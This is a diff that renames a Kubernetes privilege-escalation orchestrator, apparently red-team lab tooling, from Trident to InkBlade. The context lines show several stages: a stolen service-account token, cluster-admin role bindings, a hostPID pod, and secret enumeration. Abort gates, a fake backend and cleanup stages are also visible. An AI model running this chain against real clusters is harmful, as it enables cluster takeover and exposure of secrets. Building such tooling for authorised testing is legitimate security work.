@@ -2,7 +2,7 @@
 
 This module is intentionally separate from ``core/objective.py`` (which hosts
 the privesc planning objective).  The public API is re-exported from
-``core/objective.py`` so callers keep using ``trident.core.objective``.
+``core/objective.py`` so callers keep using ``inkblade.core.objective``.
 """
 
 from __future__ import annotations
@@ -68,7 +68,7 @@ def normalize_marker(marker: str) -> tuple[str, str, str]:
     slug = re.sub(r"[^a-z0-9-]+", "-", raw.lower()).strip("-")[:40].rstrip("-")
     if not slug:
         raise ValueError("proof-marker 无法归一化为 Kubernetes 名称")
-    marker_name = raw if raw.startswith("TRIDENT-PROOF-") else f"TRIDENT-PROOF-{raw}"
+    marker_name = raw if raw.startswith("INKBLADE-PROOF-") else f"INKBLADE-PROOF-{raw}"
     return raw, slug, marker_name
 
 
@@ -192,12 +192,12 @@ class KubectlBackend:
             raise StageFailed("kubeconfig 中没有可用的 cluster")
         out = {
             "apiVersion": "v1", "kind": "Config",
-            "clusters": [{"name": "trident-stolen", "cluster": cluster.get("cluster") or {}}],
-            "contexts": [{"name": "trident-stolen",
-                          "context": {"cluster": "trident-stolen",
-                                      "user": "trident-stolen"}}],
-            "current-context": "trident-stolen",
-            "users": [{"name": "trident-stolen", "user": {"token": token}}],
+            "clusters": [{"name": "inkblade-stolen", "cluster": cluster.get("cluster") or {}}],
+            "contexts": [{"name": "inkblade-stolen",
+                          "context": {"cluster": "inkblade-stolen",
+                                      "user": "inkblade-stolen"}}],
+            "current-context": "inkblade-stolen",
+            "users": [{"name": "inkblade-stolen", "user": {"token": token}}],
         }
         target = Path(path)
         target.parent.mkdir(parents=True, exist_ok=True)
@@ -390,42 +390,42 @@ class FakeKubectlBackend:
         self.tokens: dict[str, str] = {}
         self.node_files: dict[str, str] = {}
         self.state: dict[str, Any] = {
-            "namespaces": ["default", "kube-system", "trident-killchain", "trident-proof"],
+            "namespaces": ["default", "kube-system", "inkblade-killchain", "inkblade-proof"],
             "nodes": {"k3s-fake": {
                 "name": "k3s-fake", "ready": True, "kubelet": "v1.36.5+k3s1",
                 "os": "Alpine Linux v3.24 (fake)", "kernel": "6.18.58-0-virt (fake)",
                 "containerRuntime": "containerd://2.3.4-k3s1.36 (fake)",
                 "internalIP": "10.0.2.15"}},
             "services": {
-                "trident-proof/mock-target": {
-                    "namespace": "trident-proof", "name": "mock-target", "type": "NodePort",
+                "inkblade-proof/mock-target": {
+                    "namespace": "inkblade-proof", "name": "mock-target", "type": "NodePort",
                     "clusterIP": "10.43.41.60", "port": 8000, "nodePort": 30080,
                     "targetPort": 8000},
-                "trident-killchain/operator-metrics": {
-                    "namespace": "trident-killchain", "name": "operator-metrics",
+                "inkblade-killchain/operator-metrics": {
+                    "namespace": "inkblade-killchain", "name": "operator-metrics",
                     "type": "ClusterIP", "clusterIP": "10.43.55.10", "port": 8080,
                     "nodePort": None, "targetPort": 8080}},
-            "serviceaccounts": {"trident-killchain/trident-operator": {
+            "serviceaccounts": {"inkblade-killchain/inkblade-operator": {
                 "kind": "ServiceAccount",
-                "metadata": {"name": "trident-operator", "namespace": "trident-killchain",
+                "metadata": {"name": "inkblade-operator", "namespace": "inkblade-killchain",
                              "annotations": {}}}},
-            "clusterroles": {"trident-operator-broad": {
-                "kind": "ClusterRole", "metadata": {"name": "trident-operator-broad"},
+            "clusterroles": {"inkblade-operator-broad": {
+                "kind": "ClusterRole", "metadata": {"name": "inkblade-operator-broad"},
                 "rules": [{"apiGroups": ["rbac.authorization.k8s.io"],
                            "resources": ["*"], "verbs": ["*"]}]}},
-            "clusterrolebindings": {"trident-operator-broad": {
-                "kind": "ClusterRoleBinding", "metadata": {"name": "trident-operator-broad"},
-                "roleRef": {"kind": "ClusterRole", "name": "trident-operator-broad"},
-                "subjects": [{"kind": "ServiceAccount", "name": "trident-operator",
-                              "namespace": "trident-killchain"}]}},
+            "clusterrolebindings": {"inkblade-operator-broad": {
+                "kind": "ClusterRoleBinding", "metadata": {"name": "inkblade-operator-broad"},
+                "roleRef": {"kind": "ClusterRole", "name": "inkblade-operator-broad"},
+                "subjects": [{"kind": "ServiceAccount", "name": "inkblade-operator",
+                              "namespace": "inkblade-killchain"}]}},
             "rolebindings": {}, "pods": {}, "configmaps": {},
             "secrets": {
                 "default/default-token-fake": {"namespace": "default",
                                                "name": "default-token-fake", "type": "Opaque"},
                 "kube-system/k3s-serving": {"namespace": "kube-system",
                                             "name": "k3s-serving", "type": "kubernetes.io/tls"},
-                "kube-system/trident-lab-agent-token": {
-                    "namespace": "kube-system", "name": "trident-lab-agent-token",
+                "kube-system/inkblade-lab-agent-token": {
+                    "namespace": "kube-system", "name": "inkblade-lab-agent-token",
                     "type": "Opaque"}},
         }
 
@@ -719,7 +719,7 @@ def _refuse(gate: str, detail: str) -> None:
 def check_gates(store: EvidenceStore, session, chain: dict[str, Any], namespace: str,
                 *, host: str | None = None, auto_approve: bool = False) -> dict[str, Any]:
     if abort_info(store).get("requested"):
-        _refuse("紧急停止", "工作区已请求紧急停止；请先 `trident abort --clear`")
+        _refuse("紧急停止", "工作区已请求紧急停止；请先 `inkblade abort --clear`")
     try:
         assert_not_aborted(store)
     except ExecutionLocked as exc:
@@ -920,7 +920,7 @@ def _stage_entry(ctx: _Ctx) -> dict[str, Any]:
         raise StageFailed(f"入口 HTTP 探测失败: {probe.get('status')} "
                           f"{probe.get('error') or ''}")
     fixture = ctx.chain["objective"].get("fixture") or {}
-    sa_name = fixture.get("serviceaccount", "trident-operator")
+    sa_name = fixture.get("serviceaccount", "inkblade-operator")
     if not ctx.backend.get("serviceaccounts", sa_name, namespace=ctx.namespace):
         raise StageFailed(f"脆弱 operator SA 不存在: {ctx.namespace}/{sa_name}")
     subject = f"system:serviceaccount:{ctx.namespace}:{sa_name}"
@@ -944,7 +944,7 @@ def _stage_entry(ctx: _Ctx) -> dict[str, Any]:
 
 def _stage_credential(ctx: _Ctx) -> dict[str, Any]:
     fixture = ctx.chain["objective"].get("fixture") or {}
-    sa_name = fixture.get("serviceaccount", "trident-operator")
+    sa_name = fixture.get("serviceaccount", "inkblade-operator")
     sa = ctx.backend.get("serviceaccounts", sa_name, namespace=ctx.namespace)
     if not sa:
         raise StageFailed(f"ServiceAccount 不存在: {ctx.namespace}/{sa_name}")
@@ -988,19 +988,19 @@ def _stage_rbac(ctx: _Ctx) -> dict[str, Any]:
     if not ctx.backend.get("namespaces", ctx.namespace):
         raise StageFailed(f"namespace {ctx.namespace} 不存在")
     fixture = ctx.chain["objective"].get("fixture") or {}
-    sa_name = fixture.get("serviceaccount", "trident-operator")
+    sa_name = fixture.get("serviceaccount", "inkblade-operator")
     subject = {"kind": "ServiceAccount", "name": sa_name, "namespace": ctx.namespace}
     rb = ctx.tb_apply({
         "apiVersion": "rbac.authorization.k8s.io/v1", "kind": "RoleBinding",
         "metadata": {"name": ctx.pwn_rb, "namespace": ctx.namespace,
-                     "labels": {"trident.io/objective": ctx.slug}},
+                     "labels": {"inkblade.io/objective": ctx.slug}},
         "roleRef": {"apiGroup": "rbac.authorization.k8s.io", "kind": "ClusterRole",
                     "name": "cluster-admin"},
         "subjects": [subject]})
     ctx.action("create", "rolebinding", ctx.namespace, ctx.pwn_rb, result=rb, mutates=True)
     crb = ctx.tb_apply({
         "apiVersion": "rbac.authorization.k8s.io/v1", "kind": "ClusterRoleBinding",
-        "metadata": {"name": ctx.pwn_crb, "labels": {"trident.io/objective": ctx.slug}},
+        "metadata": {"name": ctx.pwn_crb, "labels": {"inkblade.io/objective": ctx.slug}},
         "roleRef": {"apiGroup": "rbac.authorization.k8s.io", "kind": "ClusterRole",
                     "name": "cluster-admin"},
         "subjects": [subject]})
@@ -1024,8 +1024,8 @@ def _stage_privileged_pod(ctx: _Ctx) -> dict[str, Any]:
     obj = ctx.tb_apply({
         "apiVersion": "v1", "kind": "Pod",
         "metadata": {"name": ctx.pwn_pod, "namespace": ctx.namespace,
-                     "labels": {"trident.io/objective": ctx.slug,
-                                "app": "trident-proof"}},
+                     "labels": {"inkblade.io/objective": ctx.slug,
+                                "app": "inkblade-proof"}},
         "spec": {"hostPID": True, "hostNetwork": False,
                  "automountServiceAccountToken": False, "restartPolicy": "Never",
                  "containers": [{"name": "proof", "image": ctx.pod_image,
@@ -1105,7 +1105,7 @@ def _stage_cluster_proof(ctx: _Ctx) -> dict[str, Any]:
     ns = ctx.tb_apply({
         "apiVersion": "v1", "kind": "Namespace",
         "metadata": {"name": ctx.test_namespace,
-                     "labels": {"trident.io/objective": ctx.slug}}})
+                     "labels": {"inkblade.io/objective": ctx.slug}}})
     ctx.action("create", "namespace", "", ctx.test_namespace, result=ns, mutates=True)
     deadline = time.monotonic() + 30
     while time.monotonic() < deadline:
@@ -1118,19 +1118,19 @@ def _stage_cluster_proof(ctx: _Ctx) -> dict[str, Any]:
         "node_hostname", "")
     cm = ctx.tb_apply({
         "apiVersion": "v1", "kind": "ConfigMap",
-        "metadata": {"name": "trident-proof", "namespace": ctx.test_namespace},
+        "metadata": {"name": "inkblade-proof", "namespace": ctx.test_namespace},
         "data": {"marker": ctx.marker_name, "node": node_name,
                  "secret_count": str(len(secrets)), "objective": CHAIN_ID}})
-    ctx.action("create", "configmap", ctx.test_namespace, "trident-proof", result=cm,
+    ctx.action("create", "configmap", ctx.test_namespace, "inkblade-proof", result=cm,
                mutates=True)
-    cm_read = ctx.backend.get("configmaps", "trident-proof", namespace=ctx.test_namespace)
+    cm_read = ctx.backend.get("configmaps", "inkblade-proof", namespace=ctx.test_namespace)
     if not cm_read or (cm_read.get("data") or {}).get("marker") != ctx.marker_name:
         raise StageFailed("测试 ConfigMap 回读失败")
     return {"secrets": {"count": len(secrets),
                         "namespaces": sorted({s["namespace"] for s in secrets}),
                         "names": [f"{s['namespace']}/{s['name']}" for s in secrets]},
             "test_namespace": {"name": ctx.test_namespace, "created": True},
-            "test_configmap": {"name": "trident-proof", "namespace": ctx.test_namespace,
+            "test_configmap": {"name": "inkblade-proof", "namespace": ctx.test_namespace,
                                "read_back": True, "data": cm_read.get("data") or {}},
             "node_marker_readback": marker.stdout, "nodes": ctx.backend.nodes()}
 
@@ -1184,7 +1184,7 @@ def _stage_cleanup(ctx: _Ctx) -> dict[str, Any]:
     if not marker_check["ok"]:
         residue.append(f"node-marker:{ctx.node_path}")
 
-    _delete_target(ctx, "configmaps", "trident-proof", ctx.test_namespace)
+    _delete_target(ctx, "configmaps", "inkblade-proof", ctx.test_namespace)
     _delete_target(ctx, "namespaces", ctx.test_namespace, "")
     _delete_target(ctx, "clusterrolebindings", ctx.pwn_crb, "")
     _delete_target(ctx, "rolebindings", ctx.pwn_rb, ctx.namespace)
@@ -1261,7 +1261,7 @@ def _stage_cleanup(ctx: _Ctx) -> dict[str, Any]:
     crbs = set(ctx.backend.clusterrolebindings())
     checks.append({"check": "no objective clusterrolebinding", "ok": ctx.pwn_crb not in crbs,
                    "observed": sorted(x for x in crbs
-                                      if x.startswith("trident-pwn"))[:10]})
+                                      if x.startswith("inkblade-pwn"))[:10]})
     if ctx.pwn_crb in crbs:
         residue.append(f"clusterrolebinding:{ctx.pwn_crb}")
     verified = all(c["ok"] for c in checks) and not residue
@@ -1389,7 +1389,7 @@ def run_objective(store: EvidenceStore, session, chain: dict[str, Any], backend:
                   host: str | None = None) -> dict[str, Any]:
     if not 1 <= int(max_stage) <= STAGE_COUNT:
         raise ValueError(f"max_stage 必须在 1–{STAGE_COUNT}")
-    ns = namespace or (chain["objective"].get("namespace_default") or "trident-killchain")
+    ns = namespace or (chain["objective"].get("namespace_default") or "inkblade-killchain")
     gates = check_gates(store, session, chain, ns, host=host, auto_approve=auto_approve)
     stages = chain["objective"]["stages"]
     # 阶段③前自动选路：记录最短可行提权路径、理由与备选；失败回退 stage-3 引擎
@@ -1415,9 +1415,9 @@ def run_objective(store: EvidenceStore, session, chain: dict[str, Any], backend:
     run = store.create_run(f"objective-{CHAIN_ID}-{time.strftime('%Y%m%d-%H%M%S')}-{slug}")
     ctx = _Ctx(backend=backend, store=store, run=run, session=session, chain=chain,
                marker=raw_marker, slug=slug, marker_name=marker_name, namespace=ns,
-               test_namespace=f"trident-proof-{slug}",
-               pwn_rb=f"trident-pwn-rb-{slug}", pwn_crb=f"trident-pwn-crb-{slug}",
-               pwn_pod=f"trident-pwn-pod-{slug}",
+               test_namespace=f"inkblade-proof-{slug}",
+               pwn_rb=f"inkblade-pwn-rb-{slug}", pwn_crb=f"inkblade-pwn-crb-{slug}",
+               pwn_pod=f"inkblade-pwn-pod-{slug}",
                node_path=f"/root/{marker_name}", pod_image=pod_image,
                entry_url=entry_url, cleanup_fixture=cleanup_fixture)
     run.log_action(session.name, "objective", CHAIN_ID,
@@ -1670,7 +1670,7 @@ def _build_proof(ctx: _Ctx, gates: dict[str, Any], stage_results: list[dict[str,
     s5 = ctx.stage_evidence.get("stage-5-node-marker") or {}
     s6 = ctx.stage_evidence.get("stage-6-cluster-proof") or {}
     proof: dict[str, Any] = {
-        "schema": "trident.objective.proof/v1", "chain": CHAIN_ID,
+        "schema": "inkblade.objective.proof/v1", "chain": CHAIN_ID,
         "generated_at": time.time(), "run": ctx.run.name, "marker": ctx.marker,
         "marker_name": ctx.marker_name,
         "backend": {"kind": getattr(backend, "kind", "unknown"),
@@ -1891,8 +1891,8 @@ def render_report(proof: dict[str, Any], lang: str = "bi") -> str:
         lines.append(f"- `{gate.get('id')}`: {gate.get('status')} / "
                      f"max_action={gate.get('max_action')} — {gate.get('reason')}")
     lines += ["", "---", _pick(
-        lang, "*本报告由 Trident objective 编排器生成；证据锚为 proof.json 与三层证据库。*",
-        "*Generated by the Trident objective orchestrator; evidence anchors are "
+        lang, "*本报告由 InkBlade objective 编排器生成；证据锚为 proof.json 与三层证据库。*",
+        "*Generated by the InkBlade objective orchestrator; evidence anchors are "
         "proof.json and the three-layer evidence store.*")]
     return "\n".join(lines) + "\n"
 
